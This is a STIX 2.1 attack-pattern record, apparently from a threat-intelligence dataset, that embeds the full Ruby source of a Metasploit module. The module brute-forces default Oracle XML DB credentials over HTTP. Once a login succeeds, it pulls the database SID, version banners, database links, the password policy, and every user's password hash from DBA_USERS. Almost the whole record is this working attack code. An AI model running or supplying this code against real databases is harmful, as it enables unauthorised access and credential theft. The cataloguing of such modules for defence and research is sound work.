{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c548bca-e1ea-4e47-b6a8-776a041c749e",
    "created": "2024-08-14T16:27:56.004089Z",
    "modified": "2024-08-14T16:27:56.004093Z",
    "name": "Oracle XML DB SID Discovery via Brute Force",
    "description": " This module attempts to retrieve the sid from the Oracle XML DB httpd server utilizing Pete Finnigan's default oracle password list.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/oracle/xdb_sid_brute.rb",
            "external_id": "xdb_sid_brute.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.petefinnigan.com/default/oracle_default_passwords.csv"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Oracle XML DB SID Discovery via Brute Force',\n      'Description' => %q{\n          This module attempts to retrieve the sid from the Oracle XML DB httpd server,\n          utilizing Pete Finnigan's default oracle password list.\n      },\n      'References'  =>\n        [\n          [ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],\n          [ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],\n        ],\n      'Author'      => [ 'nebulus' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n        [\n          OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),\n          Opt::RPORT(8080),\n        ])\n  end\n\n  def run_host(ip)\n    begin\n\n    res = send_request_raw({\n      'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',\n      'version' => '1.0',\n      'method'  => 'GET'\n    }, 5)\n    return if not res\n\n    if(res.code == 200)\n      vprint_status(\"http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code}) is not password protected.\")\n      return\n    elsif(res.code == 403 || res.code == 401)\n      print_status(\"http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code})\")\n    end\n\n    list = datastore['CSVFILE']\n    users = []\n\n    fd = CSV.foreach(list) do |brute|\n\n      dbuser = brute[2].downcase\n      dbpass = brute[3].downcase\n      user_pass = \"#{dbuser}:#{dbpass}\"\n\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',\n        'version' => '1.0',\n        'method'  => 'GET',\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, 10)\n\n      if( not res )\n        vprint_error(\"Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}...\")\n        next\n      end\n      if (res.code == 200)\n        if (not res.body.length > 0)\n        # sometimes weird bug where body doesn't have value yet\n          res.body = res.bufq\n        end\n        sid = res.body.scan(/<GLOBAL_NAME>(\\S+)<\\/GLOBAL_NAME>/)[0]\n        report_note(\n          :host => ip,\n          :proto\t=> 'tcp',\n          :port => datastore['RPORT'],\n          :type => 'SERVICE_NAME',\n          :data => sid,\n          :update => :unique_data\n        )\n        print_good(\"Discovered SID: '#{sid[0]}' for host #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}\")\n        users.push(user_pass)\n      else\n        vprint_error(\"Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{dbuser} / #{dbpass}...\")\n      end\n    end #fd.each\n\n    good = false\n    users.each do |user_pass|\n      (u,p) = user_pass.split(':')\n\n      # get versions\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/PRODUCT_COMPONENT_VERSION',\n        'version' => '1.1',\n        'method'  => 'GET',\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, -1)\n\n      if(res)\n        if(res.code == 200)\n          if (not res.body.length > 0)\n          # sometimes weird bug where body doesn't have value yet\n            res.body = res.bufq\n          end\n\n          doc = REXML::Document.new(res.body)\n\n          print_good(\"Version Information ==> as #{u}\")\n          doc.elements.each('PRODUCT_COMPONENT_VERSION/ROW') do |e|\n            p = e.elements['PRODUCT'].get_text\n            v = e.elements['VERSION'].get_text\n            s = e.elements['STATUS'].get_text\n            report_note(\n              :host => datastore['RHOST'],\n              :sname => 'xdb',\n              :proto => 'tcp',\n              :port => datastore['RPORT'],\n              :type => 'ORA_ENUM',\n              :data => \"Component Version: #{p}#{v}\",\n              :update => :unique_data\n            )\n            print_good(\"\\t#{p}\\t\\t#{v}\\t(#{s})\")\n\n          end\n        end\n      end\n\n      # More version information\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/ALL_REGISTRY_BANNERS',\n        'version' => '1.1',\n        'method'  => 'GET',\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, -1)\n\n      if(res)\n        if(res.code == 200)\n          if (not res.body.length > 0)\n          # sometimes weird bug where body doesn't have value yet\n            res.body = res.bufq\n          end\n\n          doc = REXML::Document.new(res.body)\n\n          doc.elements.each('ALL_REGISTRY_BANNERS/ROW') do |e|\n            next if e.elements['BANNER'] == nil\n            b = e.elements['BANNER'].get_text\n            report_note(\n              :host => datastore['RHOST'],\n              :proto => 'tcp',\n              :sname => 'xdb',\n              :port => datastore['RPORT'],\n              :type => 'ORA_ENUM',\n              :data => \"Component Version: #{b}\",\n              :update => :unique_data\n            )\n            print_good(\"\\t#{b}\")\n          end\n        end\n      end\n\n      # database links\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/ALL_DB_LINKS',\n        'version' => '1.1',\n        'method'  => 'GET',\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, -1)\n\n      if(res)\n        if(res.code == 200)\n          if (not res.body.length > 0)\n          # sometimes weird bug where body doesn't have value yet\n            res.body = res.bufq\n          end\n\n          doc = REXML::Document.new(res.body)\n\n          print_good(\"Database Link Information ==> as #{u}\")\n          doc.elements.each('ALL_DB_LINKS/ROW') do |e|\n            next if(e.elements['HOST'] == nil or e.elements['USERNAME'] == nil or e.elements['DB_LINK'] == nil)\n            h = e.elements['HOST'].get_text\n            d = e.elements['DB_LINK'].get_text\n            us = e.elements['USERNAME'].get_text\n\n            sid = h.to_s.scan(/\\(SID\\s\\=\\s(\\S+)\\)\\)\\)/)[0]\n            if(h.to_s.match(/^\\(DESCRIPTION/) )\n              h = h.to_s.scan(/\\(HOST\\s\\=\\s(\\S+)\\)\\(/)[0]\n            end\n\n            if(sid and sid != \"\")\n              print_good(\"\\tLink: #{d}\\t#{us}\\@#{h[0]}/#{sid[0]}\")\n              report_note(\n                :host => h[0],\n                :proto => 'tcp',\n                :port => datastore['RPORT'],\n                :sname => 'xdb',\n                :type => 'oracle_sid',\n                :data => sid,\n                :update => :unique_data\n              )\n            else\n              print_good(\"\\tLink: #{d}\\t#{us}\\@#{h}\")\n            end\n          end\n        end\n      end\n\n\n      # get users\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/DBA_USERS',\n        'version' => '1.1',\n        'method'  => 'GET',\n        'read_max_data' => (1024*1024*10),\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, -1)\n\n      if res and res.code == 200\n        if (not res.body.length > 0)\n        # sometimes weird bug where body doesn't have value yet\n          res.body = res.bufq\n        end\n\n        doc = REXML::Document.new(res.body)\n        print_good(\"Username/Hashes on #{ip}:#{datastore['RPORT']} ==> as #{u}\")\n\n        doc.elements.each('DBA_USERS/ROW') do |user|\n\n          us = user.elements['USERNAME'].get_text\n          h = user.elements['PASSWORD'].get_text\n          as = user.elements['ACCOUNT_STATUS'].get_text\n          print_good(\"\\t#{us}:#{h}:#{as}\")\n          good = true\n          if(as.to_s == \"OPEN\")\n            report_note(\n              :host => datastore['RHOST'],\n              :proto => 'tcp',\n              :sname => 'xdb',\n              :port => datastore['RPORT'],\n              :type => 'ORA_ENUM',\n              :data => \"Active Account #{u}:#{h}:#{as}\",\n              :update => :unique_data\n            )\n          else\n            report_note(\n              :host => datastore['RHOST'],\n              :proto => 'tcp',\n              :sname => 'xdb',\n              :port => datastore['RPORT'],\n              :type => 'ORA_ENUM',\n              :data => \"Disabled Account #{u}:#{h}:#{as}\",\n              :update => :unique_data\n            )\n          end\n        end\n      end\n\n      # get password information\n      res = send_request_raw({\n        'uri'     => '/oradb/PUBLIC/USER_PASSWORD_LIMITS',\n        'version' => '1.1',\n        'method'  => 'GET',\n        'read_max_data' => (1024*1024*10),\n        'headers' =>\n        {\n          'Authorization' => \"Basic #{Rex::Text.encode_base64(user_pass)}\"\n        }\n      }, -1)\n\n      if res and res.code == 200\n        if (not res.body.length > 0)\n        # sometimes weird bug where body doesn't have value yet\n          res.body = res.bufq\n        end\n\n        doc = REXML::Document.new(res.body)\n\n        print_good(\"Password Policy ==> as #{u}\")\n        fla=plit=pgt=prt=prm=plot=''\n        doc.elements.each('USER_PASSWORD_LIMITS/ROW') do |e|\n          next if e.elements['RESOURCE_NAME'] == nil\n\n          case\n            when(e.elements['RESOURCE_NAME'].get_text == 'FAILED_LOGIN_ATTEMPTS')\n              fla = e.elements['LIMIT'].get_text\n            when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LIFE_TIME')\n              plit = e.elements['LIMIT'].get_text\n            when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_TIME')\n              prt = e.elements['LIMIT'].get_text\n            when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_MAX')\n              prm = e.elements['LIMIT'].get_text\n            when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LOCK_TIME')\n              plot = e.elements['LIMIT'].get_text\n            when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_GRACE_TIME')\n              pgt = e.elements['LIMIT'].get_text\n          end\n        end\n\n        print_good(\n          \"\\tFailed Login Attempts: #{fla}\\n\\t\" +\n          \"Password Life Time: #{plit}\\n\\t\" +\n          \"Password Reuse Time: #{prt}\\n\\t\" +\n          \"Password Reuse Max: #{prm}\\n\\t\" +\n          \"Password Lock Time: #{plot}\\n\\t\" +\n          \"Password Grace Time: #{pgt}\"\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Password Maximum Reuse Time: #{prm}\",\n          :update => :unique_data\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Password Reuse Time: #{prt}\",\n          :update => :unique_data\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Password Life Time: #{plit}\",\n          :update => :unique_data\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Account Fail Logins Permitted: #{fla}\",\n          :update => :unique_data\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Account Lockout Time: #{plot}\",\n          :update => :unique_data\n        )\n        report_note(\n          :host => datastore['RHOST'],\n          :proto => 'tcp',\n          :sname => 'xdb',\n          :port => datastore['RPORT'],\n          :type => 'ORA_ENUM',\n          :data => \"Account Password Grace Time: #{pgt}\",\n          :update => :unique_data\n        )\n      end\n\n      break if good\n    end # users.each\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ nebulus ]",
        ""
    ]
}